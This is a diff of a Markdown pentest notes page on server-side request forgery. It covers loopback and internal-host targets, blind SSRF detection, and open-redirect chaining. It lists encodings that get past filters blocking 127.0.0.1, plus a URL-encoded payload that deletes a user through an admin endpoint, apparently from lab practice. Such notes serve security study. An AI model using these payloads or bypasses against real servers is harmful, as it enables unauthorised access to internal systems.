@@ -6,27 +6,27 @@ coverY: 0
 
 # SSRF
 
-#### Server side request forgery Induce the server-side application to make HTTP requests to an random domain of the attacker's choosing.
+Server side request forgery Induce the server-side application to make HTTP requests to an random domain of the attacker's choosing.
 
 ## <mark style="color:red;">Exploiting</mark>
 
 ### <mark style="color:yellow;">SSRF against the server itself</mark>
 
-Attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface for example: http://localhost/admin
+Attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface for example: http://localhost/admin.
 
 ### <mark style="color:yellow;">SSRF against other back-end systems</mark>
 
-* Attacker can exploit the SSRF vulnerability to access the other interface by submitting a internal HTTP request (EX: http://192.168.1.105/admin)
+Attacker can exploit the SSRF vulnerability to access the other interface by submitting a internal HTTP request (EX: http://192.168.1.105/admin).
 
 ### <mark style="color:yellow;">Blind SSRF vulnerabilities</mark>
 
-Response from the back-end request is not returned in the application's front-end response
+Response from the back-end request is not returned in the application's front-end response.
 
-<mark style="color:purple;">**Find vulnerability**</mark>
+#### <mark style="color:purple;">**Find vulnerability:**</mark>
 
-Observe a DNS look-up for the supplied Burp Collaborator domain
+Observe a DNS look-up for the supplied Burp Collaborator domain.
 
-<mark style="color:purple;">**Example (Blind SSRF with Shellshock exploitation)**</mark>
+#### <mark style="color:purple;">**Example (Blind SSRF with Shellshock exploitation):**</mark>
 
 ```http
 GET /path TTP/1.1
@@ -43,9 +43,9 @@ Connection: close
 
 ### <mark style="color:yellow;">Bypass blacklist-based</mark>
 
-* Change "127.0.0.1" to
+#### <mark style="color:purple;">Change "127.0.0.1" to:</mark>
 
-```
+```http
 http://2130706433
 http://017700000001
 http://127.1
@@ -58,10 +58,12 @@ http://017700000001
 http://[::]:80
 ```
 
-* Registering your own domain name that resolves to 127.0.0.1. You can use "spoofed.burpcollaborator.net" for this purpose
-* Obfuscating blocked strings using URL encoding or case variation. Example
+* Registering your own domain name that resolves to 127.0.0.1. You can use "spoofed.burpcollaborator.net" for this purpose.
+* Obfuscating blocked strings using URL encoding or case variation.&#x20;
 
-```
+#### <mark style="color:purple;">Example:</mark>
+
+```http
 value=http://127.1/%25%36%31dmin/delete?username=carlos
 ```
 
@@ -80,7 +82,7 @@ value=http://127.1/%25%36%31dmin/delete?username=carlos
 
 <mark style="color:purple;">**Example 2:**</mark>
 
-If "/product/stock" vulnerable to SSRF and "/nextProduct" vulnerable to OpenRedirect, Then
+If "/product/stock" vulnerable to SSRF and "/nextProduct" vulnerable to OpenRedirect, Then:
 
 ```http
 // HTTP request
